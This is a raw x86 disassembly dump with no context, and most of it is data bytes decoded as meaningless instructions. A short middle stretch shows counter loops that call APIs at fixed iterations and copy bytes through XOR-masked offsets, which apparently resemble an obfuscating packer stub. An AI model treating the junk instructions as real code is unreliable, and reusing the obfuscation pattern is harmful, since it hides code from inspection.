  40f2dc:	or     BYTE PTR [edx+0x44d89b10],bh
  40f2e2:	mov    ds:0x6f57af07,eax
  40f2e7:	jo     0x40f2bc
  40f2e9:	cwde   
  40f2ea:	jns    0x40f27a
  40f2ec:	icebp  
  40f2ed:	in     eax,dx
  40f2ee:	setno  BYTE PTR [edi+0x79]
  40f2f2:	ret    0x6499
  40f2f5:	lock dec esp
  40f2f7:	cmp    al,0xaa
  40f2f9:	cmp    al,BYTE PTR [edi+esi*2+0x61abccc3]
  40f300:	jns    0x40f2f6
  40f302:	enter  0x1b3d,0x7d
  40f306:	push   esi
  40f307:	push   ebx
  40f308:	jnp    0x40f356
  40f30a:	mov    DWORD PTR [edx],edx
  40f30c:	fs push eax
  40f30e:	cmp    BYTE PTR [eax],ah
  40f310:	mov    edi,0xc12f55e1
  40f315:	stc    
  40f316:	xlat   BYTE PTR ds:[ebx]
  40f317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f318:	(bad)  
  40f319:	iret   
  40f31a:	sti    
  40f31b:	sbb    DWORD PTR [edi+0x68],ebx
  40f31e:	loopne 0x40f35e
  40f320:	jns    0x40f330
  40f322:	popa   
  40f323:	fidivr DWORD PTR [ebp+0x204341d5]
  40f329:	bound  ebp,QWORD PTR [ebx+0x28a21ab9]
  40f32f:	xchg   esi,eax
  40f330:	in     al,dx
  40f331:	jo     0x40f334
  40f333:	mov    bl,0xe7
  40f335:	jmp    0x4388bb
  40f33a:	push   ecx
  40f33b:	lds    eax,FWORD PTR [esi]
  40f33d:	adc    eax,0x97449736
  40f342:	(bad)  
  40f343:	jle    0x40f317
  40f345:	pop    esi
  40f346:	sub    al,0x53
  40f348:	loope  0x40f2ee
  40f34a:	nop
  40f34b:	(bad)  
  40f34c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f34d:	sub    DWORD PTR [edx-0x6ebdd697],esi
  40f353:	push   esp
  40f354:	shl    BYTE PTR [esi+edx*8-0xc81320],cl
  40f35b:	cmp    BYTE PTR [ebp-0x27],0x4f
  40f35f:	pushw  0x18
  40f362:	pusha  
  40f363:	in     eax,dx
  40f364:	cmpxchg DWORD PTR [edx+ecx*1+0x45f6b13b],ebp
  40f36c:	mov    cl,0x32
  40f36e:	mov    dl,0x8c
  40f370:	dec    edx
  40f371:	or     eax,0x453db13f
  40f376:	xor    ebx,DWORD PTR [edi+0x40]
  40f379:	mov    eax,0x1c006696
  40f37e:	add    eax,0xb81e1dee
  40f383:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40f389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f38a:	cmp    BYTE PTR [ebx+0x0],al
  40f38d:	add    BYTE PTR [eax],al
  40f38f:	add    BYTE PTR [eax],al
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x4338a7
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3a0:	cmp    DWORD PTR ds:0x4338a7,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x4338a7,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x4338a7
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3d0:	cmp    DWORD PTR ds:0x4338a7,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x4337ab
  40f3e3:	mov    ecx,DWORD PTR ds:0x433883
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x4337d7,0x13
  40f3fb:	cmp    DWORD PTR ds:0x4337d7,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x4337d7,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x4337d7
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x4337d7,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x43386f,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x43386f
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x43386f,ecx
  40f444:	cmp    DWORD PTR ds:0x43386f,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x43386f,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x43386f
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x43386f,ecx
  40f474:	cmp    DWORD PTR ds:0x43386f,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x43385b,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x43385b
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x43385b,edx
  40f498:	cmp    DWORD PTR ds:0x43385b,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433a11
  40f4af:	push   0x433a67
  40f4b4:	push   0x433a4b
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x43385b,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433897
  40f4d2:	adc    DWORD PTR ds:0x4338a7,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x6448abc7]
  40f540:	dec    edx
  40f541:	aam    0xac
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	pusha  
  40f54a:	adc    al,0x1e
  40f54c:	mov    DWORD PTR [ecx*4-0x42bee456],edx
  40f553:	add    BYTE PTR [ebx-0x361b4275],ch
  40f559:	retf   0xf271
  40f55c:	add    ah,ch
  40f55e:	and    dh,BYTE PTR [esi]
  40f560:	addr16 test eax,0xd5d1757f
  40f566:	cld    
  40f567:	scas   al,BYTE PTR es:[edi]
  40f568:	xchg   ecx,eax
  40f569:	xchg   DWORD PTR [ebx],ebp
  40f56b:	dec    BYTE PTR [eax+0x68]
  40f56e:	dec    ebp
  40f56f:	cmp    ecx,DWORD PTR [esi+0x25]
  40f572:	scas   al,BYTE PTR es:[edi]
  40f573:	jmp    0xe0840b23
  40f578:	jle    0x40f54f
  40f57a:	shr    DWORD PTR [ebx-0x4c],cl
  40f57d:	add    eax,0x5e8fb600
  40f582:	inc    edi
  40f583:	mov    WORD PTR [ebp-0xe],fs
  40f586:	pop    ecx
  40f587:	mov    cl,0xf0
  40f589:	aam    0xd7
  40f58b:	adc    eax,0x840206f2
  40f590:	test   eax,0xe45988ea
  40f595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f596:	out    0xe8,eax
  40f598:	(bad)  
  40f599:	inc    BYTE PTR [ecx-0x35b2858d]
  40f59f:	dec    ebp
  40f5a0:	add    ecx,edx
  40f5a2:	push   ebp
  40f5a3:	mov    eax,0x444c71a3
  40f5a8:	add    ebp,ecx
  40f5aa:	pop    ss
  40f5ab:	sbb    al,0xf4
  40f5ad:	cmp    DWORD PTR [esi+ebx*8],esi
  40f5b0:	adc    esi,edx
  40f5b2:	push   ebp
  40f5b3:	xchg   DWORD PTR [ecx+0x7b60aacc],esi
  40f5b9:	pop    edi
  40f5ba:	jne    0x40f636
  40f5bc:	or     DWORD PTR [eax],ebx
  40f5be:	lock out 0x14,eax
  40f5c1:	lock mov BYTE PTR [edi+0x6a],al
  40f5c5:	loope  0x40f617
  40f5c7:	pop    esi
  40f5c8:	test   al,0xf1
  40f5ca:	mov    BYTE PTR [ebx-0x2bf29446],bl
  40f5d0:	in     eax,0xa
  40f5d2:	std    
  40f5d3:	test   BYTE PTR [ebp+0x30],dh
  40f5d6:	and    edi,DWORD PTR [eax-0x7d7cd8a5]
  40f5dc:	adc    eax,0xf8402eb
  40f5e1:	push   edi
  40f5e2:	jns    0x40f60d
  40f5e4:	mov    BYTE PTR [edi+0x31],bh
  40f5e7:	sbb    eax,ecx
  40f5e9:	lods   al,BYTE PTR ds:[esi]
  40f5ea:	aam    0x7
  40f5ec:	jmp    0x40f576
  40f5ee:	cmp    esi,esp
  40f5f0:	popa   
  40f5f1:	mov    BYTE PTR [edx+0x67d598c8],ch
  40f5f7:	jmp    0x40f651
  40f5f9:	into   
  40f5fa:	xchg   ebx,eax
  40f5fb:	inc    edx
  40f5fc:	mov    BYTE PTR [edx],al
  40f5fe:	(bad)  
  40f600:	pop    es
  40f601:	jl     0x40f5e5
  40f603:	jle    0x40f5c4
  40f605:	sahf   
  40f606:	ror    DWORD PTR [esi-0x41],0x90
  40f60a:	push   ecx
  40f60b:	or     DWORD PTR [ebx+0x639e91c7],0xaf1f4e05
  40f615:	sar    DWORD PTR [esi],0xad
  40f618:	inc    edi
  40f619:	std    
  40f61a:	mov    ch,bh
  40f61c:	mov    ah,0x92
  40f61e:	hlt    
  40f61f:	out    0x55,al
  40f621:	push   es
  40f622:	ror    DWORD PTR [ebp-0xe],1
  40f625:	jge    0x40f62b
  40f627:	push   ebp
  40f628:	cmc    
  40f629:	add    eax,ecx
  40f62b:	push   ebx
  40f62c:	push   0x8
  40f62e:	adc    edi,DWORD PTR [esp+eax*4-0x323cf9a5]
  40f635:	sbb    ecx,DWORD PTR ds:0xfad63c28
  40f63b:	xchg   esp,eax
  40f63c:	push   ss
  40f63d:	mov    ebx,0xd248fb17
  40f642:	inc    BYTE PTR [edx+0x1cdddce]
  40f648:	push   eax
  40f649:	enter  0x3127,0xa4
  40f64d:	lds    ebp,FWORD PTR [ebp-0x499be63c]
  40f653:	stos   BYTE PTR es:[edi],al
  40f654:	mov    ebx,0x99b12505
  40f659:	popf   
  40f65a:	iret   
  40f65b:	sti    
  40f65c:	pop    ebp
  40f65d:	sbb    DWORD PTR [edi+0x554f0d18],esp
  40f663:	lods   al,BYTE PTR ds:[esi]
  40f664:	xchg   edi,esi
  40f666:	mov    ds:0x18823332,al
  40f66b:	data16 cmp ch,dh
  40f66e:	push   esi
  40f66f:	and    DWORD PTR [ebx+ebp*2-0x41],ebp
  40f673:	mov    eax,ds:0xc8316d4c
  40f678:	and    BYTE PTR [edi+0x6d942a10],ch
  40f67e:	push   ebx
  40f67f:	outs   dx,DWORD PTR ds:[esi]
  40f680:	aaa    
  40f681:	xor    al,al
  40f683:	out    0x37,eax
  40f685:	(bad)
  40f688:	iret   
  40f689:	cwde   
  40f68a:	push   cs
  40f68b:	int3   
  40f68c:	cmp    dl,al
  40f68e:	pop    ecx
  40f68f:	lock (bad) 
  40f691:	push   eax
  40f692:	repz add eax,0xe1a40b8b
  40f698:	or     eax,0x4ecc983f
  40f69d:	fmul   DWORD PTR [edx-0x40]
  40f6a0:	xlat   BYTE PTR ds:[ebx]
  40f6a1:	rcl    DWORD PTR [ebx],cl
  40f6a3:	(bad)  
  40f6a4:	push   ss
  40f6a5:	ins    BYTE PTR es:[edi],dx
  40f6a6:	mov    dl,0xf0
  40f6a8:	inc    esp
  40f6a9:	repnz adc eax,0x3a332e97
  40f6af:	sub    ecx,DWORD PTR [edi]
  40f6b1:	cmp    eax,0xf101fc31
  40f6b6:	pop    ds
  40f6b7:	shr    DWORD PTR [edi+0xd434fe5],0x90
  40f6be:	fcom   st(7)
  40f6c0:	pop    ss
  40f6c1:	fbstp  TBYTE PTR [ebx-0x4655bc70]
  40f6c7:	adc    esi,DWORD PTR [eax+0x1b]
  40f6ca:	outs   dx,DWORD PTR ds:[esi]
  40f6cb:	mov    esi,0xa0cd9c00
  40f6d0:	xor    ebx,DWORD PTR [edx+0x1f38a585]
  40f6d6:	es xor al,0x13
  40f6d9:	mov    bh,0x3e
  40f6db:	push   ss
  40f6dc:	in     eax,0xea
  40f6de:	std    
  40f6df:	adc    eax,ebx
  40f6e1:	push   ecx
  40f6e2:	rcl    DWORD PTR [eax+0x48],1
  40f6e5:	mov    ss,WORD PTR [ebp-0x7e]
  40f6e8:	and    BYTE PTR [esi-0x2a98d7fd],0xec
  40f6ef:	push   esp
  40f6f0:	mov    ah,0x35
  40f6f2:	call   0x6b118f0f
  40f6f7:	mov    edi,DWORD PTR [edi]
  40f6f9:	lea    edx,[eax-0x41]
  40f6fc:	push   edx
  40f6fd:	jge    0x40f6fd
  40f6ff:	inc    ecx
  40f700:	xchg   ecx,eax
  40f701:	add    eax,DWORD PTR [ebp+0x7f]
  40f704:	dec    esi
  40f705:	scas   eax,DWORD PTR es:[edi]
  40f706:	mov    edi,0x46fc6200
  40f70b:	ss repnz ins BYTE PTR es:[edi],dx
  40f70e:	xchg   BYTE PTR [edi],al
  40f710:	jne    0x40f74e
  40f712:	adc    DWORD PTR [ebx-0x59ceb133],edx
  40f718:	shl    BYTE PTR [esi-0x7e7a49bf],1
  40f71e:	rcl    cl,cl
  40f720:	outs   dx,BYTE PTR ds:[esi]
  40f721:	icebp  
  40f722:	mov    bh,0xcf
  40f724:	mov    DWORD PTR [ebx-0x28],0x9bc46cb1
  40f72b:	mov    DWORD PTR [eax],ecx
  40f72d:	out    dx,eax
  40f72e:	or     al,al
  40f730:	test   BYTE PTR [eax],ch
  40f732:	arpl   WORD PTR [edx-0x387ae178],bp
  40f738:	mov    al,0xa4
  40f73a:	ds mov ecx,0xf830b148
  40f740:	popa   
  40f741:	pop    eax
  40f742:	aas    
  40f743:	dec    esi
  40f744:	sar    DWORD PTR [eax+0x3e9a0fe6],1
  40f74a:	sub    DWORD PTR [eax+esi*2-0x27],esi
  40f74e:	sub    DWORD PTR [esp+esi*8+0x47],edi
  40f752:	add    eax,0x88bdb067
  40f757:	lock loop 0x40f72f
  40f75a:	dec    ecx
  40f75b:	xor    edi,ecx
  40f75d:	cmp    al,0x82
  40f75f:	push   ebp
  40f760:	xchg   edi,eax
  40f761:	test   BYTE PTR [ebp+0x2df5449],ch
  40f767:	xlat   BYTE PTR ds:[ebx]
  40f768:	mov    ebx,0x42d382fd
  40f76d:	test   al,0x8c
  40f76f:	call   0x81cf:0x92ed3122
  40f776:	sbb    dl,BYTE PTR [ecx+0x65]
  40f779:	mov    ds:0xece12159,al
  40f77e:	cwde   
  40f77f:	xlat   BYTE PTR ds:[ebx]
  40f780:	dec    esi
  40f781:	fwait
  40f782:	out    0xde,eax
  40f784:	test   eax,0x28e3731e
  40f789:	cdq    
  40f78a:	iret   
  40f78b:	shl    DWORD PTR [edx-0x1c0a8d7c],0x26
  40f792:	fisubr WORD PTR [ebp+0x3b]
  40f795:	dec    ecx
  40f796:	sbb    al,BYTE PTR [edi+esi*2+0x6d]
  40f79a:	adc    BYTE PTR [esi*8+0x57e6e5d9],ah
  40f7a1:	sar    BYTE PTR [edx+0x4c995e4e],0x55
  40f7a8:	mov    esi,0x3537d87d
  40f7ad:	pop    esi
  40f7ae:	jp     0x40f7ad
  40f7b0:	jecxz  0x40f786
  40f7b2:	mov    DWORD PTR [ecx],esp
  40f7b4:	and    ebx,DWORD PTR ds:0x853a31e8
  40f7ba:	cld    
  40f7bb:	retf   
  40f7bc:	std    
  40f7bd:	or     bl,BYTE PTR es:[ebx-0x215f882]
  40f7c4:	dec    esi
  40f7c5:	inc    ebx
  40f7c6:	xor    si,WORD PTR [esi-0x7cc825f5]
  40f7cd:	mov    dl,0x11
  40f7cf:	arpl   WORD PTR [edi],bp
  40f7d1:	imul   BYTE PTR [ecx-0x124dc553]
  40f7d7:	pop    ebp
  40f7d8:	and    al,0x20
  40f7da:	xchg   edi,eax
  40f7db:	repnz loopne 0x40f7af
  40f7de:	adc    edx,DWORD PTR [ecx+esi*8+0x43da039e]
  40f7e5:	aas    
  40f7e6:	sub    bh,BYTE PTR [ecx-0x73]
  40f7e9:	ds mov ch,0xa8
  40f7ec:	and    esi,edx
  40f7ee:	aaa    
  40f7ef:	ds sub eax,0x1d9f00fb
  40f7f5:	fild   DWORD PTR [ebp-0x2c]
  40f7f8:	jecxz  0x40f77d
  40f7fa:	inc    ebp
  40f7fb:	cmovns ecx,DWORD PTR [edx+0x193721b5]
  40f802:	arpl   WORD PTR [edx+0x11],cx
  40f805:	xchg   ecx,eax
  40f806:	rol    DWORD PTR [ecx-0x4d],1
  40f809:	fistp  WORD PTR [esi]
  40f80b:	dec    eax
  40f80c:	pop    edi
  40f80d:	or     esp,DWORD PTR [ebx-0x176a20fc]
  40f813:	rcl    DWORD PTR [esi],1
  40f815:	sub    eax,0x2bd60f4f
  40f81a:	push   eax
  40f81b:	xor    bh,BYTE PTR [esi-0x21]
  40f81e:	mov    dh,0x62
  40f820:	jle    0x40f88e
  40f822:	out    dx,eax
  40f823:	mov    edx,0xdaf27110
  40f828:	jecxz  0x40f819
  40f82a:	sub    eax,0x8d4b9adb
  40f82f:	jb     0x40f835
  40f831:	out    dx,eax
  40f832:	and    BYTE PTR [ebx*8-0x3335fb73],ah
  40f839:	cmp    BYTE PTR [ebp-0x6e],cl
  40f83c:	xchg   ecx,eax
  40f83d:	lods   eax,DWORD PTR ds:[esi]
  40f83e:	mov    ?,ebp
  40f840:	add    dh,0x8b
  40f843:	frstor [ebx]
  40f845:	add    DWORD PTR [edx],edi
  40f847:	xor    esp,esp
  40f849:	pushf  
  40f84a:	or     eax,0xfe03f933
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xa44583f
  40f897:	adc    dl,0xab
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	repnz or eax,0x4c1a81a4
  40f8a6:	xor    ah,BYTE PTR [edx+esi*1-0x6e]
  40f8aa:	stos   DWORD PTR es:[edi],eax
  40f8ab:	arpl   WORD PTR [ecx],sp
  40f8ad:	jnp    0x40f856
  40f8af:	jo     0x40f89f
  40f8b1:	jo     0x40f8c6
  40f8b3:	adc    eax,0xd176007
  40f8b8:	ins    BYTE PTR es:[edi],dx
  40f8b9:	popa   
  40f8ba:	in     eax,dx
  40f8bb:	mov    bl,0xdb
  40f8bd:	call   0x4e65:0x58125290
  40f8c4:	rcr    BYTE PTR [ebx+0x2a8179d6],cl
  40f8ca:	sub    DWORD PTR [ecx],0xffffffe2
  40f8cd:	jbe    0x40f8f3
  40f8cf:	inc    esi
  40f8d0:	and    esp,DWORD PTR [edx+0x5b1baedb]
  40f8d6:	dec    ebp
  40f8d7:	repz mov ch,0x61
  40f8da:	ja     0x40f8a0
  40f8dc:	rcl    edi,1
  40f8de:	xor    DWORD PTR [esi+0x17],eax
  40f8e1:	inc    ecx
  40f8e2:	xor    BYTE PTR [ebp-0x12bd0588],bl
  40f8e8:	iret   
  40f8e9:	xchg   DWORD PTR [ecx],esi
  40f8eb:	mov    al,0x6
  40f8ed:	xchg   esi,eax
  40f8ee:	sti    
  40f8ef:	and    al,0x42
  40f8f1:	scas   eax,DWORD PTR es:[edi]
  40f8f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8f3:	or     eax,0xb58aeb49
  40f8f8:	sub    BYTE PTR [edx-0x2df90896],dh
  40f8fe:	jb     0x40f93a
  40f900:	in     al,0x6
  40f902:	fwait
  40f903:	xlat   BYTE PTR ds:[ebx]
  40f904:	push   ecx
  40f905:	inc    edi
  40f906:	mov    DWORD PTR [esi],ebp
  40f908:	xchg   ebx,eax
  40f909:	loope  0x40f8f9
  40f90b:	dec    edi
  40f90c:	xlat   BYTE PTR ds:[ebx]
  40f90d:	mov    al,ds:0x2dedeb56
  40f912:	pop    edi
  40f913:	mov    ds:0x62f3be0,eax
  40f918:	leave  
  40f919:	xor    al,0x93
  40f91b:	dec    eax
  40f91c:	mov    ebp,0x364e14c2
  40f921:	push   si
  40f923:	in     eax,0xab
  40f925:	mov    dl,0x7c
  40f927:	xchg   ecx,eax
  40f928:	mov    WORD PTR [edx+0x2214eb82],ss
  40f92e:	mov    bh,0xc1
  40f930:	xchg   edi,eax
  40f931:	or     al,0xa0
  40f933:	or     BYTE PTR [eax+0x6ce338b0],0x82
  40f93a:	mov    ah,BYTE PTR [esi+0x5a]
  40f93d:	dec    edi
  40f93e:	in     al,0xf9
  40f940:	and    eax,0xf891f076
  40f945:	jne    0x40f940
  40f947:	adc    ecx,esp
  40f949:	retf   0xe01e
  40f94c:	adc    ebx,DWORD PTR [eax+0x5e1e1ffa]
  40f952:	cwde   
  40f953:	retf   
  40f954:	dec    eax
  40f955:	in     eax,dx
  40f956:	dec    esi
  40f957:	add    eax,0xa85a271b
  40f95c:	fnstsw WORD PTR [esi]
  40f95e:	cld    
  40f95f:	push   es
  40f960:	jle    0x40f99b
  40f962:	loope  0x40f9ab
  40f964:	xchg   esp,eax
  40f965:	mov    al,ds:0x2de4fc9a
  40f96a:	or     ebp,DWORD PTR [ecx-0x683c006]
  40f970:	dec    eax
  40f971:	outs   dx,DWORD PTR ds:[esi]
  40f972:	mov    al,0x22
  40f974:	mov    esp,0xb6d19581
  40f979:	nop
  40f97a:	ror    DWORD PTR [ecx-0xbfec63b],1
  40f980:	sub    dh,bh
  40f982:	jecxz  0x40f931
  40f984:	das    
  40f985:	mov    bh,0xe7
  40f987:	and    al,0x56
  40f989:	xchg   ecx,eax
  40f98a:	inc    bl
  40f98c:	lods   eax,DWORD PTR ds:[esi]
  40f98d:	scas   eax,DWORD PTR es:[edi]
  40f98e:	jae    0x40f985
  40f990:	lds    di,DWORD PTR [esi+0x792605a1]
  40f997:	dec    edx
  40f998:	push   cs
  40f999:	mov    es,WORD PTR [eax+0x4b26c552]
  40f99f:	or     esp,DWORD PTR [eax-0xc]
  40f9a2:	cmp    DWORD PTR [eax-0x5b5f1eae],edi
  40f9a8:	fs pushf 
  40f9aa:	mov    ecx,0x390a2704
  40f9af:	inc    ebx
  40f9b0:	jae    0x40f9f3
  40f9b2:	arpl   WORD PTR [ebp-0x69768a10],si
  40f9b8:	sub    DWORD PTR [ecx-0x70d0ec98],eax
  40f9be:	cmp    edx,DWORD PTR [ebx]
  40f9c0:	add    edx,ebp
  40f9c2:	dec    eax
  40f9c3:	xchg   ecx,eax
  40f9c4:	and    al,BYTE PTR [edi-0x218713b0]
  40f9ca:	out    dx,al
  40f9cb:	xchg   esp,eax
  40f9cc:	mov    dh,0xf5
  40f9ce:	pop    ebp
  40f9cf:	pop    ebp
  40f9d0:	aas    
  40f9d1:	sub    ecx,esi
  40f9d3:	arpl   WORD PTR [edi],sp
  40f9d5:	mov    esi,0x6938819e
  40f9da:	jle    0x40f982
  40f9dc:	and    BYTE PTR [ecx],0x54
  40f9df:	pop    esi
  40f9e0:	mov    ch,0xfe
  40f9e2:	cli    
  40f9e3:	jge    0x40f9c2
  40f9e5:	ret    
  40f9e6:	outs   dx,BYTE PTR ds:[esi]
  40f9e7:	push   es
  40f9e8:	mov    BYTE PTR ds:0x77613e86,dl
  40f9ee:	sbb    eax,0x451509f6
  40f9f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9f4:	sbb    DWORD PTR [ebx+eax*8],esi
  40f9f7:	or     edx,DWORD PTR [edi+0x4c]
  40f9fa:	ret    0x7847
  40f9fd:	outs   dx,BYTE PTR ds:[esi]
  40f9fe:	cdq    
  40f9ff:	mov    bl,0x37
  40fa01:	dec    esp
  40fa02:	imul   esp,ecx,0xffffffe9
  40fa05:	in     al,dx
  40fa06:	push   0xffffffc6
  40fa08:	(bad)  
  40fa09:	rcr    DWORD PTR [ebp+0x42],cl
  40fa0c:	add    al,0x7e
  40fa0e:	ret    0x4284
  40fa11:	out    0x2e,al
  40fa13:	inc    ebp
  40fa14:	and    BYTE PTR [esi+0x6],cl
  40fa17:	les    esi,FWORD PTR [eax+edi*2]
  40fa1a:	and    edi,DWORD PTR [eax+0x72]
  40fa1d:	or     al,0x9
  40fa1f:	sub    al,0x3a
  40fa21:	retf   0xe22e
  40fa24:	pop    es
  40fa25:	and    al,0x5b
  40fa27:	mov    bh,0x2b
  40fa29:	jecxz  0x40fa33
  40fa2b:	aas    
  40fa2c:	dec    eax
  40fa2d:	daa    
  40fa2e:	icebp  
  40fa2f:	sbb    edi,DWORD PTR [ebx+0x12]
  40fa32:	jmp    0x40f9cb
  40fa34:	sbb    ah,ah
  40fa36:	loopne 0x40fa85
  40fa38:	rcr    ch,0x7f
  40fa3b:	rcl    DWORD PTR [ecx+0x4],0xc5
  40fa3f:	push   DWORD PTR [edi-0x63739ca4]
  40fa45:	arpl   cx,ax
  40fa47:	mov    eax,0x7eddc282
  40fa4c:	test   ebx,eax
  40fa4e:	jmp    0x3cd86893
  40fa53:	and    esi,DWORD PTR [edx]
  40fa55:	imul   ebp,DWORD PTR [ecx+0x46],0xffffffe1
  40fa59:	call   0xedaa6704
  40fa5e:	out    dx,al
  40fa5f:	(bad)  
  40fa60:	mov    ebx,0xf44e22b8
  40fa65:	sbb    DWORD PTR [ebp-0x28d143ce],edi
  40fa6b:	pop    ebp
  40fa6c:	test   al,0x3d
  40fa6e:	mov    al,ds:0xfe2842c2
  40fa73:	aad    0x91
  40fa75:	and    al,0x4c
  40fa77:	sub    DWORD PTR [eax+0x7f41277c],eax
  40fa7d:	ret    
  40fa7e:	push   edx
  40fa7f:	push   0xf2566f18
  40fa84:	push   edi
  40fa85:	rsqrtps xmm5,XMMWORD PTR [eax]
  40fa88:	cmp    ecx,0x23
  40fa8b:	popf   
  40fa8c:	sar    DWORD PTR [edx+0x78dade],cl
  40fa92:	pop    eax
  40fa93:	call   FWORD PTR [ebp-0x7f]
  40fa96:	dec    edi
  40fa97:	test   al,0x21
  40fa99:	sbb    DWORD PTR [edi-0x50],ebp
  40fa9c:	cmp    DWORD PTR [edi-0x6f],ecx
  40fa9f:	outs   dx,BYTE PTR ds:[esi]
  40faa0:	add    ah,BYTE PTR [ebx+edi*4-0x1f233895]
  40faa7:	hlt    
  40faa8:	stc    
  40faa9:	icebp  
  40faaa:	sub    eax,0x7b9e482c
  40faaf:	sbb    esp,esi
  40fab1:	sub    BYTE PTR [eax+edi*2+0x52f0ccc0],dl
  40fab8:	or     al,0x2c
  40faba:	mov    cs,WORD PTR [eax]
  40fabc:	mov    al,0xac
  40fabe:	loopne 0x40fa7e
  40fac0:	(bad)  
  40fac2:	dec    DWORD PTR [ebp+eiz*8+0x5d]
  40fac6:	pusha  
  40fac7:	jle    0x40faef
  40fac9:	mov    gs,WORD PTR [ebx-0x20a75221]
  40facf:	addr16 retf 
  40fad1:	stos   BYTE PTR es:[edi],al
  40fad2:	cmp    DWORD PTR [ebp-0x4ac081d3],esi
  40fad8:	fisttp WORD PTR [edi+0x60]
  40fadb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fadc:	test   eax,0x9afcf7a6
  40fae1:	das    
  40fae2:	outs   dx,DWORD PTR ds:[esi]
  40fae3:	cmp    DWORD PTR [ebp-0x2e],ebx
  40fae6:	or     dh,BYTE PTR [edi+0x363eae19]
  40faec:	ret    
  40faed:	hlt    
  40faee:	addr16 out dx,al
  40faf0:	inc    esi
  40faf1:	mov    al,0x3d
  40faf3:	mov    cl,ch
  40faf5:	xor    ebx,esi
  40faf7:	hlt    
  40faf8:	or     edi,DWORD PTR [edi-0x73]
  40fafb:	cdq    
  40fafc:	cs dec edx
  40fafe:	mov    ch,0x4e
  40fb00:	leave  
  40fb01:	out    0x2,al
